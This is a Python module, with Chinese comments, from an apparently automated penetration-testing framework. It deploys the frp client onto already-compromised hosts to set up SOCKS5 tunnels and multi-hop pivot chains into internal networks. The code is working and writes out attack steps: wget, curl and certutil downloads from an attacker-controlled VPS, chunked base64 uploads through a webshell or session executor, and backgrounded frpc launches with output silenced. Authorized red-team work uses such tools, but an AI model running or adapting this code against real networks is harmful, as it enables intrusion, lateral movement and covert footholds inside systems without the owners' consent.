# tools/frp_manager.py
"""
frp代理管理器

功能：
- 自动检测目标系统类型
- 上传frp客户端
- 生成配置文件
- 建立SOCKS5代理
- 支持多级代理链
"""

import os
import json
import base64
import shutil
import subprocess
import tempfile
from typing import Dict, List, Any, Optional
from pathlib import Path
from tool_framework import CommandLineTool


class FRPManager(CommandLineTool):
    """
    frp代理管理器

    简化版代理方案：只用frp
    """

    # frp二进制文件目录 (镜像内置)
    FRP_DIR = Path("/opt/frp")

    # 默认VPS配置（需要用户修改）
    DEFAULT_VPS_IP = "YOUR_VPS_IP"
    DEFAULT_VPS_PORT = 7000

    def __init__(self):
        super().__init__("frpc")
        self.timeout = 60

    def name(self) -> str:
        return "frp-manager"

    def description(self) -> str:
        return "frp代理管理器，自动部署SOCKS5代理，支持多级代理链。"

    def supported_vulns(self) -> list:
        return ["Proxy Setup", "SOCKS5", "Multi-hop Proxy"]

    def check_available(self) -> bool:
        """检查frp文件是否存在"""
        linux_frp = self.FRP_DIR / "frpc"
        windows_frp = Path("/opt/tools/windows/frpc.exe")

        # 也检查系统 PATH
        system_frpc = shutil.which("frpc")

        return linux_frp.exists() or windows_frp.exists() or system_frpc is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: setup/status/stop",
                "required": True
            },
            "vps_ip": {
                "type": "str",
                "description": "VPS服务器IP",
                "required": False
            },
            "vps_port": {
                "type": "int",
                "description": "VPS frps端口，默认7000",
                "required": False
            },
            "remote_port": {
                "type": "int",
                "description": "远程SOCKS5端口",
                "required": False
            },
            "target_host": {
                "type": "str",
                "description": "目标主机（已获得shell的主机）",
                "required": False
            },
            "system_type": {
                "type": "str",
                "description": "目标系统类型: linux/windows",
                "required": False
            },
            "upload_method": {
                "type": "str",
                "description": "上传方式: echo/base64/wget/curl",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行frp操作"""
        action = params.get("action", "setup")

        if action == "setup":
            return self._setup_proxy(params)
        elif action == "status":
            return self._check_status(params)
        elif action == "stop":
            return self._stop_proxy(params)
        else:
            return {"error": f"未知操作: {action}", "success": False}

    def _setup_proxy(self, params: Dict) -> Dict:
        """
        设置代理

        步骤：
        1. 检测系统类型
        2. 选择frp二进制
        3. 生成配置文件
        4. 提供上传和启动命令
        """
        vps_ip = params.get("vps_ip", self.DEFAULT_VPS_IP)
        vps_port = params.get("vps_port", self.DEFAULT_VPS_PORT)
        remote_port = params.get("remote_port", 10800)
        system_type = params.get("system_type", "linux")

        # 检查VPS配置
        if vps_ip == "YOUR_VPS_IP":
            return {
                "error": "请先配置VPS IP地址",
                "success": False,
                "hint": "在params中设置vps_ip参数"
            }

        # 选择frp二进制
        if system_type == "windows":
            frp_binary = self.FRP_DIR / "frpc.exe"
            config_name = "frpc.toml"
        else:
            frp_binary = self.FRP_DIR / "frpc"
            config_name = "frpc.toml"

        # 检查frp文件是否存在
        if not frp_binary.exists():
            return {
                "error": f"frp文件不存在: {frp_binary}",
                "success": False,
                "hint": "frp应在镜像中自动下载到/opt/frp/目录，请检查Dockerfile",
                "download_url": "https://github.com/fatedier/frp/releases"
            }

        # 生成配置文件
        config_content = self._generate_config(
            vps_ip=vps_ip,
            vps_port=vps_port,
            remote_port=remote_port
        )

        # 生成上传命令
        upload_commands = self._generate_upload_commands(
            frp_binary=frp_binary,
            config_content=config_content,
            system_type=system_type
        )

        # 生成启动命令
        start_command = self._generate_start_command(system_type)

        return {
            "success": True,
            "action": "setup",
            "proxy_info": {
                "vps_ip": vps_ip,
                "vps_port": vps_port,
                "remote_port": remote_port,
                "socks5_address": f"{vps_ip}:{remote_port}"
            },
            "config_content": config_content,
            "upload_commands": upload_commands,
            "start_command": start_command,
            "proxychains_config": f"socks5 {vps_ip} {remote_port}",
            "notes": [
                "1. 先在VPS上启动frps服务端",
                "2. 通过webshell/ssh执行上传命令",
                "3. 启动frpc客户端",
                f"4. 使用代理: proxychains4 -q command (配置socks5 {vps_ip} {remote_port})"
            ]
        }

    def _generate_config(self, vps_ip: str, vps_port: int,
                         remote_port: int) -> str:
        """生成frpc.toml配置文件"""
        config = f"""# frpc configuration
serverAddr = "{vps_ip}"
serverPort = {vps_port}

[[proxies]]
name = "socks5"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1080
remotePort = {remote_port}
"""
        return config

    def _generate_upload_commands(self, frp_binary: Path,
                                   config_content: str,
                                   system_type: str) -> Dict[str, str]:
        """生成各种上传方式的命令"""
        commands = {}

        # 读取二进制文件
        with open(frp_binary, "rb") as f:
            binary_data = f.read()

        binary_b64 = base64.b64encode(binary_data).decode()
        config_b64 = base64.b64encode(config_content.encode()).decode()

        if system_type == "linux":
            # 方式1: echo base64
            commands["echo_base64"] = f"""
# Upload frpc binary
echo '{binary_b64[:1000]}...' | base64 -d > /tmp/frpc
# (需要分块上传，每块1000字符)

# Upload config
echo '{config_b64}' | base64 -d > /tmp/frpc.toml

# Set permissions
chmod +x /tmp/frpc
"""

            # 方式2: wget
            commands["wget"] = f"""
# 从VPS下载
wget http://YOUR_VPS/frpc -O /tmp/frpc
wget http://YOUR_VPS/frpc.toml -O /tmp/frpc.toml
chmod +x /tmp/frpc
"""

            # 方式3: curl
            commands["curl"] = f"""
curl http://YOUR_VPS/frpc -o /tmp/frpc
curl http://YOUR_VPS/frpc.toml -o /tmp/frpc.toml
chmod +x /tmp/frpc
"""

        else:  # Windows
            commands["echo_base64"] = f"""
# Upload frpc.exe (PowerShell)
[IO.File]::WriteAllBytes("C:\\temp\\frpc.exe", [Convert]::FromBase64String("{binary_b64[:1000]}..."))

# Upload config (PowerShell)
[IO.File]::WriteAllBytes("C:\\temp\\frpc.toml", [Convert]::FromBase64String("{config_b64}"))
"""

            commands["certutil"] = f"""
# Using certutil (CMD)
certutil -urlcache -split -f http://YOUR_VPS/frpc.exe C:\\temp\\frpc.exe
certutil -urlcache -split -f http://YOUR_VPS/frpc.toml C:\\temp\\frpc.toml
"""

        return commands

    def _generate_start_command(self, system_type: str) -> str:
        """生成启动命令"""
        if system_type == "linux":
            return """
# Start frpc in background
cd /tmp
nohup ./frpc -c frpc.toml > /dev/null 2>&1 &

# Check if running
ps aux | grep frpc
"""
        else:
            return """
# Start frpc (Windows)
cd C:\\temp
start /B frpc.exe -c frpc.toml

# Check if running
tasklist | findstr frpc
"""

    def _check_status(self, params: Dict) -> Dict:
        """检查代理状态"""
        # 从memory读取代理状态
        try:
            from memory.memory_manager import get_memory_manager
            mm = get_memory_manager()
            proxies = mm.get_active_proxies()
            return {
                "success": True,
                "active_proxies": proxies,
                "count": len(proxies)
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def _stop_proxy(self, params: Dict) -> Dict:
        """停止代理"""
        system_type = params.get("system_type", "linux")

        if system_type == "linux":
            kill_command = "pkill frpc"
        else:
            kill_command = "taskkill /F /IM frpc.exe"

        return {
            "success": True,
            "action": "stop",
            "kill_command": kill_command
        }

    def build_proxy_chain(self, hops: List[Dict]) -> Dict:
        """
        构建多级代理链

        Args:
            hops: 跳板列表，每项包含 {host, port, system_type}

        Returns:
            代理链配置
        """
        chain = []
        proxychains_lines = []

        for i, hop in enumerate(hops):
            remote_port = 10800 + i  # 每跳使用不同端口

            setup_result = self._setup_proxy({
                "vps_ip": hop.get("vps_ip", self.DEFAULT_VPS_IP),
                "vps_port": hop.get("vps_port", self.DEFAULT_VPS_PORT),
                "remote_port": remote_port,
                "system_type": hop.get("system_type", "linux")
            })

            chain.append({
                "hop": i + 1,
                "host": hop.get("host"),
                "remote_port": remote_port,
                "setup": setup_result
            })

            proxychains_lines.append(f"socks5 {hop.get('vps_ip')} {remote_port}")

        return {
            "success": True,
            "chain": chain,
            "proxychains_config": "\n".join(proxychains_lines),
            "total_hops": len(hops)
        }

    # =========================================================================
    # 多跳代理增强（新增功能）
    # =========================================================================

    def setup_multi_hop_proxy(self, hop_chain: List[Dict]) -> Dict:
        """
        设置多跳代理链

        Args:
            hop_chain: 跳板链列表，每项包含:
                {
                    "host": "主机IP",
                    "system_type": "linux/windows",
                    "vps_ip": "VPS IP（可选）",
                    "vps_port": 7000,
                    "local_socks_port": 1080
                }

        Returns:
            代理链配置和命令
        """
        if len(hop_chain) < 1:
            return {"error": "跳板链为空", "success": False}

        chain_config = []
        current_vps_port = 7000
        current_remote_port = 10800

        for i, hop in enumerate(hop_chain):
            hop_config = self._setup_single_hop(
                hop=hop,
                hop_index=i,
                vps_port=current_vps_port,
                remote_port=current_remote_port
            )

            chain_config.append(hop_config)

            # 下一跳使用当前跳的端口
            current_vps_port = hop.get("vps_port", current_vps_port)
            current_remote_port += 1

        # 生成proxychains配置
        proxychains_conf = self._generate_multi_hop_proxychains(chain_config)

        return {
            "success": True,
            "chain": chain_config,
            "total_hops": len(hop_chain),
            "proxychains_config": proxychains_conf,
            "final_socks_address": f"{hop_chain[-1].get('vps_ip', self.DEFAULT_VPS_IP)}:{10800 + len(hop_chain) - 1}"
        }

    def _setup_single_hop(self, hop: Dict, hop_index: int,
                          vps_port: int, remote_port: int) -> Dict:
        """设置单跳代理"""
        system_type = hop.get("system_type", "linux")
        vps_ip = hop.get("vps_ip", self.DEFAULT_VPS_IP)

        # 生成配置
        config = self._generate_config(
            vps_ip=vps_ip,
            vps_port=vps_port,
            remote_port=remote_port
        )

        # 生成上传命令
        upload_cmds = self._generate_upload_commands(
            frp_binary=self.FRP_DIR / ("frpc" if system_type == "linux" else "frpc.exe"),
            config_content=config,
            system_type=system_type
        )

        # 生成启动命令
        start_cmd = self._generate_start_command(system_type)

        return {
            "hop_index": hop_index + 1,
            "host": hop.get("host", "unknown"),
            "system_type": system_type,
            "vps_ip": vps_ip,
            "vps_port": vps_port,
            "remote_port": remote_port,
            "config": config,
            "upload_commands": upload_cmds,
            "start_command": start_cmd,
            "socks_address": f"{vps_ip}:{remote_port}"
        }

    def _generate_multi_hop_proxychains(self, chain: List[Dict]) -> str:
        """生成多跳proxychains配置"""
        lines = ["# Multi-hop proxy chain configuration"]

        for hop in chain:
            socks_addr = hop.get("socks_address", "")
            if socks_addr:
                lines.append(f"socks5 {socks_addr}")

        return "\n".join(lines)

    def generate_nested_tunnel_commands(self, pivot_hosts: List[Dict]) -> Dict:
        """
        生成嵌套隧道命令

        用于多层内网环境：外网 -> DMZ -> 内网 -> 核心网络

        Args:
            pivot_hosts: 跳板主机列表，按顺序排列

        Returns:
            完整的嵌套隧道配置
        """
        if not pivot_hosts:
            return {"error": "跳板主机列表为空"}

        nested_config = {
            "layers": [],
            "total_layers": len(pivot_hosts),
            "commands": []
        }

        for i, pivot in enumerate(pivot_hosts):
            layer = {
                "layer": i + 1,
                "pivot_host": pivot.get("host"),
                "pivot_os": pivot.get("os_type", "linux"),
                "upstream_proxy": None,
                "local_port": 10800 + i
            }

            # 设置上游代理（如果有）
            if i > 0:
                prev_layer = nested_config["layers"][i - 1]
                layer["upstream_proxy"] = prev_layer["local_port"]

            # 生成该层的代理命令
            proxy_cmd = self._generate_layer_proxy_command(layer, pivot)
            nested_config["commands"].append(proxy_cmd)

            nested_config["layers"].append(layer)

        # 生成最终的proxychains配置
        final_conf = self._generate_nested_proxychains_conf(nested_config)
        nested_config["final_proxychains"] = final_conf

        return nested_config

    def _generate_layer_proxy_command(self, layer: Dict, pivot: Dict) -> Dict:
        """生成单层代理命令"""
        system_type = layer["pivot_os"]

        # 基础配置
        config = {
            "serverAddr": pivot.get("vps_ip", self.DEFAULT_VPS_IP),
            "serverPort": 7000 + layer["layer"] - 1,
            "localPort": layer["local_port"],
            "remotePort": layer["local_port"]
        }

        # 如果有上游代理，需要通过上游连接
        if layer["upstream_proxy"]:
            config["via_proxy"] = f"socks5://127.0.0.1:{layer['upstream_proxy']}"

        return {
            "layer": layer["layer"],
            "config": config,
            "commands": self._generate_start_command(system_type)
        }

    def _generate_nested_proxychains_conf(self, nested_config: Dict) -> str:
        """生成嵌套proxychains配置"""
        lines = ["# Nested tunnel proxychains configuration"]

        for layer in reversed(nested_config["layers"]):
            # 从最内层到最外层
            lines.append(f"# Layer {layer['layer']}: {layer['pivot_host']}")
            lines.append(f"socks5 127.0.0.1 {layer['local_port']}")

        return "\n".join(lines)

    def check_proxy_chain_health(self, chain: List[Dict]) -> Dict:
        """
        检查代理链健康状态

        Args:
            chain: 代理链配置

        Returns:
            各跳的状态
        """
        import socket

        health_status = {
            "healthy": True,
            "hops": []
        }

        for hop in chain:
            host = hop.get("vps_ip", "")
            port = hop.get("remote_port", 0)

            if host and port:
                try:
                    # 尝试连接
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    result = sock.connect_ex((host, port))
                    sock.close()

                    is_healthy = result == 0
                    health_status["hops"].append({
                        "hop": hop.get("hop_index", 0),
                        "address": f"{host}:{port}",
                        "healthy": is_healthy
                    })

                    if not is_healthy:
                        health_status["healthy"] = False

                except Exception as e:
                    health_status["hops"].append({
                        "hop": hop.get("hop_index", 0),
                        "address": f"{host}:{port}",
                        "healthy": False,
                        "error": str(e)
                    })
                    health_status["healthy"] = False

        return health_status

    # =========================================================================
    # 自动部署方法（全自动化功能）
    # =========================================================================

    def auto_deploy_proxy(self, params: Dict, session_executor=None) -> Dict:
        """
        自动部署代理（全自动化）

        Args:
            params: 代理参数，包含：
                - vps_ip: VPS IP
                - vps_port: VPS端口
                - remote_port: 远程SOCKS端口
                - system_type: linux/windows
                - target_host: 目标主机
                - upload_path: 上传路径（可选）
            session_executor: 会话执行器（用于执行命令）

        Returns:
            部署结果
        """
        vps_ip = params.get("vps_ip", self.DEFAULT_VPS_IP)
        vps_port = params.get("vps_port", self.DEFAULT_VPS_PORT)
        remote_port = params.get("remote_port", 10800)
        system_type = params.get("system_type", "linux")
        target_host = params.get("target_host", "")
        upload_path = params.get("upload_path", "/tmp" if system_type == "linux" else "C:\\temp")

        if vps_ip == "YOUR_VPS_IP":
            return {
                "error": "请配置VPS IP地址",
                "success": False,
                "hint": "在环境变量 FRP_VPS_IP 或配置文件中设置"
            }

        # 步骤1: 生成配置
        setup_result = self._setup_proxy(params)
        if not setup_result.get("success"):
            return setup_result

        # 步骤2: 如果有会话执行器，自动执行上传和启动
        if session_executor:
            return self._auto_execute_deployment(
                setup_result,
                session_executor,
                system_type,
                upload_path
            )

        # 没有执行器，返回手动执行指令
        return {
            "success": True,
            "mode": "manual",
            "setup": setup_result,
            "message": "已生成部署配置，需要手动执行上传命令"
        }

    def _auto_execute_deployment(self, setup_result: Dict, executor,
                                  system_type: str, upload_path: str) -> Dict:
        """自动执行部署"""
        import time

        results = {
            "steps": [],
            "success": True
        }

        # 获取二进制和配置
        frp_binary = self.FRP_DIR / ("frpc" if system_type == "linux" else "frpc.exe")
        config_content = setup_result.get("config_content", "")

        # 步骤1: 创建目录
        if system_type == "linux":
            mkdir_cmd = f"mkdir -p {upload_path}"
        else:
            mkdir_cmd = f"mkdir {upload_path}"

        results["steps"].append({
            "step": "mkdir",
            "command": mkdir_cmd,
            "result": executor.execute(mkdir_cmd)
        })

        # 步骤2: 上传二进制文件（分块base64）
        try:
            with open(frp_binary, "rb") as f:
                binary_data = f.read()

            binary_b64 = base64.b64encode(binary_data).decode()
            chunk_size = 8000  # 避免命令行长度限制

            # 分块上传
            for i in range(0, len(binary_b64), chunk_size):
                chunk = binary_b64[i:i+chunk_size]
                if system_type == "linux":
                    upload_cmd = f"echo '{chunk}' >> {upload_path}/frpc.b64"
                else:
                    upload_cmd = f"echo {chunk} >> {upload_path}\\frpc.b64"

                executor.execute(upload_cmd)

            # 解码
            if system_type == "linux":
                decode_cmd = f"base64 -d {upload_path}/frpc.b64 > {upload_path}/frpc && chmod +x {upload_path}/frpc"
            else:
                decode_cmd = f"certutil -decode {upload_path}\\frpc.b64 {upload_path}\\frpc.exe"

            results["steps"].append({
                "step": "upload_binary",
                "chunks": (len(binary_b64) + chunk_size - 1) // chunk_size,
                "result": executor.execute(decode_cmd)
            })

        except Exception as e:
            results["steps"].append({
                "step": "upload_binary",
                "error": str(e)
            })
            results["success"] = False
            return results

        # 步骤3: 上传配置文件
        config_b64 = base64.b64encode(config_content.encode()).decode()
        if system_type == "linux":
            config_cmd = f"echo '{config_b64}' | base64 -d > {upload_path}/frpc.toml"
        else:
            config_cmd = f"echo {config_b64} | certutil -decode - {upload_path}\\frpc.toml"

        results["steps"].append({
            "step": "upload_config",
            "result": executor.execute(config_cmd)
        })

        # 步骤4: 启动代理
        if system_type == "linux":
            start_cmd = f"cd {upload_path} && nohup ./frpc -c frpc.toml > /dev/null 2>&1 &"
        else:
            start_cmd = f"cd {upload_path} && start /B frpc.exe -c frpc.toml"

        results["steps"].append({
            "step": "start_proxy",
            "result": executor.execute(start_cmd)
        })

        # 步骤5: 验证
        time.sleep(2)

        if system_type == "linux":
            check_cmd = "ps aux | grep frpc | grep -v grep"
        else:
            check_cmd = "tasklist | findstr frpc"

        check_result = executor.execute(check_cmd)
        results["steps"].append({
            "step": "verify",
            "running": "frpc" in str(check_result),
            "result": check_result
        })

        results["proxy_info"] = setup_result.get("proxy_info", {})
        results["message"] = "代理部署完成" if results["success"] else "代理部署失败"

        return results

    def auto_deploy_multi_hop(self, hop_chain: List[Dict], session_executors: Dict) -> Dict:
        """
        自动部署多跳代理链

        Args:
            hop_chain: 跳板链配置列表
            session_executors: {host: executor} 映射

        Returns:
            部署结果
        """
        if len(hop_chain) < 1:
            return {"error": "跳板链为空", "success": False}

        results = {
            "hops": [],
            "success": True,
            "final_socks": None
        }

        for i, hop in enumerate(hop_chain):
            host = hop.get("host", "")
            executor = session_executors.get(host)

            if not executor:
                results["hops"].append({
                    "hop": i + 1,
                    "host": host,
                    "error": "无可用执行器",
                    "success": False
                })
                results["success"] = False
                continue

            # 部署该跳
            deploy_result = self.auto_deploy_proxy(hop, executor)

            results["hops"].append({
                "hop": i + 1,
                "host": host,
                "result": deploy_result
            })

            if not deploy_result.get("success"):
                results["success"] = False

        # 设置最终代理地址
        if results["success"] and hop_chain:
            last_hop = hop_chain[-1]
            results["final_socks"] = f"{last_hop.get('vps_ip', self.DEFAULT_VPS_IP)}:{last_hop.get('remote_port', 10800)}"

        return results


def setup_single_proxy(vps_ip: str, vps_port: int = 7000,
                        remote_port: int = 10800,
                        system_type: str = "linux") -> Dict:
    """
    快速设置单个代理

    Args:
        vps_ip: VPS IP地址
        vps_port: frps端口
        remote_port: SOCKS5端口
        system_type: linux/windows

    Returns:
        设置结果
    """
    manager = FRPManager()
    return manager._setup_proxy({
        "vps_ip": vps_ip,
        "vps_port": vps_port,
        "remote_port": remote_port,
        "system_type": system_type
    })


def register():
    """注册frp管理器"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(FRPManager())


# =========================================================================
# 多跳代理便捷函数
# =========================================================================

def setup_multi_hop_proxy_chain(hop_hosts: List[Dict]) -> Dict:
    """
    快速设置多跳代理链

    Args:
        hop_hosts: 跳板主机列表

    Returns:
        代理链配置
    """
    manager = FRPManager()
    return manager.setup_multi_hop_proxy(hop_hosts)


def check_proxy_health(vps_ip: str, socks_port: int) -> bool:
    """
    检查单个代理健康状态

    Args:
        vps_ip: VPS IP
        socks_port: SOCKS端口

    Returns:
        是否健康
    """
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((vps_ip, socks_port))
        sock.close()
        return result == 0
    except:
        return False


# =========================================================================
# 自动部署便捷函数
# =========================================================================

def auto_setup_proxy(vps_ip: str, vps_port: int = 7000,
                      remote_port: int = 10800,
                      system_type: str = "linux",
                      session_executor=None) -> Dict:
    """
    自动设置代理

    Args:
        vps_ip: VPS IP地址
        vps_port: frps端口
        remote_port: SOCKS5端口
        system_type: linux/windows
        session_executor: 会话执行器（可选）

    Returns:
        部署结果
    """
    manager = FRPManager()
    params = {
        "vps_ip": vps_ip,
        "vps_port": vps_port,
        "remote_port": remote_port,
        "system_type": system_type
    }
    return manager.auto_deploy_proxy(params, session_executor)


def get_vps_config_from_env() -> Dict:
    """从环境变量获取VPS配置"""
    return {
        "vps_ip": os.environ.get("FRP_VPS_IP", "YOUR_VPS_IP"),
        "vps_port": int(os.environ.get("FRP_VPS_PORT", "7000")),
        "remote_port": int(os.environ.get("FRP_REMOTE_PORT", "10800"))
    }